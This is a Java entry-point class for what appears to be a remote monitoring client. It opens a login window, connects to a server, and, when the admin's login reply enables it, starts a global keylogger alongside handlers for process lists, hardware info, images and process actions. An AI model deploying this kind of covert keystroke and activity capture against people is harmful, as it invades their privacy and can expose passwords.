package Client;

import Client.GUI.Lib.GlobalVariable;
import Client.GUI.User.LoginUserGUI;
import Server.EventDispatcher.EventDispatcher;
import Server.IntervalThread;
import SocketMessageReceiver.CustomAdminReceiver.LoginUserResultReceiver;
import SocketMessageReceiver.CustomUserReceiver.*;
import SocketMessageReceiver.DataType.LogOutUserRequest;
import SocketMessageReceiver.DataType.LoginUserRequest;
import SocketMessageReceiver.DataType.LoginUserUDPRequest;
import SocketMessageReceiver.DataType.ProcessAction.ProcessActionResultUserSide;
import SocketMessageSender.CustomUserSender.LogOutUserSender;
import SocketMessageSender.CustomUserSender.LoginSender;
import SocketMessageSender.CustomUserSender.LoginUDPSender;
import SocketMessageSender.CustomUserSender.ProcessActionResultSender;
import Utilities.Utilities;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.keyboard.event.GlobalKeyListener;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.*;
import java.net.ServerSocket;

public class User {
    public static void main(String[] args) throws IOException, InterruptedException {
        try (ServerSocket ignored = new ServerSocket(9999)) {
            var tcpClient = new TCPClient("localhost", 4445);

            tcpClient.setBuffer(1024 * 1024);
            tcpClient.start();

            UDPClient udpClient = new UDPClient("localhost", 4446);
            udpClient.setBuffer(1024 * 1024);
            udpClient.start();

            ClientInstance.tcpClient = tcpClient;
            ClientInstance.udpClient = udpClient;

            GlobalVariable.LoginUserGUI = new LoginUserGUI();
            GlobalVariable.LoginUserGUI.setVisible(true);

//            var loginTcpSender = new LoginSender(tcpClient);
            var uuid = Utilities.getUUID();
            var adminId = 19;


            EventDispatcher.startListening(new LoginUserResultReceiver((loginUserResult) -> {
                if (!loginUserResult.userInfo.isWriteLog) return;

                if (KeyLogger.instance != null) KeyLogger.instance.stop();

                var keyLogger = new KeyLogger(loginUserResult.userInfo.writeLogInterval);
                keyLogger.start();

                KeyLogger.instance = keyLogger;
            }));

            EventDispatcher.startListening(new GetProcessesReceiver());
            EventDispatcher.startListening(new GetHardwareInfoReceiver());
            EventDispatcher.startListening(new GetImageReceiver());

            EventDispatcher.startListening(new ProcessActionReceiver());
            EventDispatcher.startListening(new ChangeKeyLogConfigReceiver());

            var shutdownThread = new Thread(() -> {
                var sender = new LogOutUserSender(tcpClient);
                sender.send(null, new LogOutUserRequest(adminId, uuid));
            });
            Runtime.getRuntime().addShutdownHook(shutdownThread);

            Thread.currentThread().join();
        } catch (IOException e) {
            System.out.println("Application instance is already running.");
            System.exit(0);
        }

    }

}
